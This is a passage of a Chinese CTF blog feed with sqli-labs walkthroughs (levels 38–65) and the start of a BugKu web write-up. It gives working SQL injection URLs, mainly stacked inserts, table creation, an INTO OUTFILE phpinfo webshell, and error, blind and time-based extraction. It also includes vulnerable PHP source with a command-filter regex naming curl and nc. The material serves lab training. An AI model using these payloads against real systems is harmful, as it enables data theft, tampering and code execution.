class="variable">$passwd</span>= <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$passwd1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="Page-3-Stacked-Injections"><a href="#Page-3-Stacked-Injections" class="headerlink" title="Page-3  (Stacked Injections)"></a>Page-3  (Stacked Injections)</h2><h3 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 stacked Query</h3><h4 id="手动注入-39"><a href="#手动注入-39" class="headerlink" title="手动注入"></a>手动注入</h4><p>加入一条数据</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-38/?id=1&#x27;;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;less38&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/FTXO3ltsWAHe6aS.png" alt="38.png"></p><h3 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 stacked Query Intiger type</h3><h4 id="手动注入-40"><a href="#手动注入-40" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-39/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;less39&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 stacked Query String type Blind</h3><h4 id="手动注入-41"><a href="#手动注入-41" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-40/?id=1&#x27;); <span class="attribute">insert</span> into users(id,username, password) values (<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;less40&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 stacked Query Intiger type blind</h3><h4 id="手动注入-42"><a href="#手动注入-42" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-41/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;less41&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-35"><a href="#源码分析-35" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h3><h4 id="手动注入-43"><a href="#手动注入-43" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’;create table less42 like users–+</p><p><img src="https://s2.loli.net/2022/05/17/5ovkQSFNKgiWfdH.png" alt="42.png"></p><h3 id="less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入"><a href="#less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入" class="headerlink" title="less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)"></a>less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)</h3><h4 id="手动注入-44"><a href="#手动注入-44" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’);create table less43 like users–+</p><h3 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h3><h4 id="手动注入-45"><a href="#手动注入-45" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’;create table less44 like users–+</p><h3 id="less-45-基于报错的password处的’-闭合注入"><a href="#less-45-基于报错的password处的’-闭合注入" class="headerlink" title="less-45 基于报错的password处的’)闭合注入"></a>less-45 基于报错的password处的’)闭合注入</h3><h4 id="手动注入-46"><a href="#手动注入-46" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’);create table less45 like users–+</p><h3 id="less-46-ORDER-BY-Error-Numeric"><a href="#less-46-ORDER-BY-Error-Numeric" class="headerlink" title="less-46 ORDER BY-Error-Numeric"></a>less-46 ORDER BY-Error-Numeric</h3><h4 id="手动注入-47"><a href="#手动注入-47" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-46/?sort=(<span class="attribute">select</span> count(*) from information_schema.columns group by concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand()*<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#也可以导入导出文件into outfile 参数</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-36"><a href="#源码分析-36" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h3><h4 id="手动注入-48"><a href="#手动注入-48" class="headerlink" title="手动注入"></a>手动注入</h4><p><img src="https://s2.loli.net/2022/05/17/qi8F1NCMIayvPrH.png" alt="47.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-47/?sort=1&#x27;<span class="attribute">into</span> outfile <span class="string">&quot;文件地址&quot;</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><h3 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h3><h4 id="手动注入-49"><a href="#手动注入-49" class="headerlink" title="手动注入"></a>手动注入</h4><p>布尔盲注、延时注入及对文件操作均可，除不能报错注入外同Less-46</p><h3 id="Less49-ORDER-BY-Clause-Blind-based"><a href="#Less49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less49 - ORDER BY Clause Blind based"></a>Less49 - ORDER BY Clause Blind based</h3><h4 id="手动注入-50"><a href="#手动注入-50" class="headerlink" title="手动注入"></a>手动注入</h4><p>除不能报错注入外同Less-47</p><h3 id="Less50-ORDER-BY-Clause-Blind-based"><a href="#Less50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less50 - ORDER BY Clause Blind based"></a>Less50 - ORDER BY Clause Blind based</h3><h4 id="手动注入-51"><a href="#手动注入-51" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-50/?sort=1;<span class="attribute">create</span> table less50 like users</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VZUAQPF5jBvIJ8r.png" alt="50.png"></p><h3 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h3><h4 id="手动注入-52"><a href="#手动注入-52" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-51/?sort=1&#x27;;<span class="attribute">create</span> table less51 like users--+</span><br></pre></td></tr></table></figure><h3 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h3><h4 id="手动注入-53"><a href="#手动注入-53" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-52/?sort=1;<span class="attribute">create</span> table less52 like users</span><br></pre></td></tr></table></figure><h3 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h3><h4 id="手动注入-54"><a href="#手动注入-54" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-53/?sort=1&#x27;;<span class="attribute">create</span> table less53 like users--+</span><br></pre></td></tr></table></figure><h2 id="Page-4-Challenges"><a href="#Page-4-Challenges" class="headerlink" title="Page-4  (Challenges)"></a>Page-4  (Challenges)</h2><h3 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h3><h4 id="手动注入-55"><a href="#手动注入-55" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取表名cul94axau9</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取列名id,sessid,secret_B27K,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;cul94axau9&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取答案</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_B27K) from challenges.cul94axau9--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/1aoe3HdJVti8zqP.png" alt="54.png"></p><h3 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h3><h4 id="手动注入-56"><a href="#手动注入-56" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取表名k6cm9525rm</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取列名id,sessid,secret_6TMN,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;k6cm9525rm&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取答案</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_6TMN) from challenges.k6cm9525rm--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/ScPXqw9oER13LjV.png" alt="55.png"></p><h3 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h3><h4 id="手动注入-57"><a href="#手动注入-57" class="headerlink" title="手动注入"></a>手动注入</h4><p>本关使用<code>(&#39;&#39;)</code>处理输入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-56/?id=-1&#x27;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-37"><a href="#源码分析-37" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h3><h4 id="手动注入-58"><a href="#手动注入-58" class="headerlink" title="手动注入"></a>手动注入</h4><p>本关使用<code>&quot;&quot;</code>处理输入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-57/?id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-38"><a href="#源码分析-38" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h3><h4 id="手动注入-59"><a href="#手动注入-59" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-58/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h3><h4 id="手动注入-60"><a href="#手动注入-60" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-59/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-39"><a href="#源码分析-39" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h3><h4 id="手动注入-61"><a href="#手动注入-61" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-60/?id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-40"><a href="#源码分析-40" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h3><h4 id="手动注入-62"><a href="#手动注入-62" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=-1&#x27;))<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-41"><a href="#源码分析-41" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h3><h4 id="手动注入-63"><a href="#手动注入-63" class="headerlink" title="手动注入"></a>手动注入</h4><p>延时注入（可以使用脚本）</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=1&#x27;)<span class="attribute">and</span> If(ascii(substr((<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,sleep(<span class="number">10</span>))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-42"><a href="#源码分析-42" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h3><h4 id="手动注入-64"><a href="#手动注入-64" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p><h4 id="源码分析-43"><a href="#源码分析-43" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h3><h4 id="手动注入-65"><a href="#手动注入-65" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p><h4 id="源码分析-44"><a href="#源码分析-44" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h3><h4 id="手动注入-66"><a href="#手动注入-66" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p><h4 id="源码分析-45"><a href="#源码分析-45" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="常用方法总结"><a href="#常用方法总结" class="headerlink" title="常用方法总结"></a>常用方法总结</h2><h3 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h3><p>Mysql 有一个系统数据库<code>information_schema</code>，存储着所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p><h4 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select xxxx from xxxxxx </span><br></pre></td></tr></table></figure><blockquote><p>上述知识参考用例：less1-less4</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录 4</title>
      <link href="/2022/05/05/BugKu-Web4/"/>
      <url>/2022/05/05/BugKu-Web4/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录-4"><a href="#BugKu-Web-刷题记录-4" class="headerlink" title="BugKu Web 刷题记录 4"></a>BugKu Web 刷题记录 4</h1><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13044403.html">ctf中的序列化和反序列化</a></p><p><a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p><a href="https://blog.csdn.net/plant1234/article/details/118033711">sql注入</a></p></blockquote><h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>添加<code>Referer</code>字段即可。</p><p><img src="https://s2.loli.net/2022/05/05/UEJoHjpm5KwqFAP.png" alt="where.png"></p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>根据提示得知是md5碰撞，故构造payload如下即可获得flag。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:14728/index.php?a=s878926199a</span><br></pre></td></tr></table></figure><h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>添加<code>client-ip</code>字段即可</p><p><img src="https://s2.loli.net/2022/05/05/mYO5zAiGuXM1skr.png" alt="clientip.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>访问<code>http://114.67.175.224:12650/flag.txt</code>得到<code>bugku</code>,然后构造payload即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:12650/?ac=bugku&amp;fn=flag.txt</span><br></pre></td></tr></table></figure><h2 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h2><p>F12查看源码，发现base64编码，解码后为<code>backups</code>，用dirsearch扫描一遍发现有bak文件，下载下来即可获得源码</p><p><img src="https://s2.loli.net/2022/05/05/esNlIwZaiT1OxQg.png" alt="anwei1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 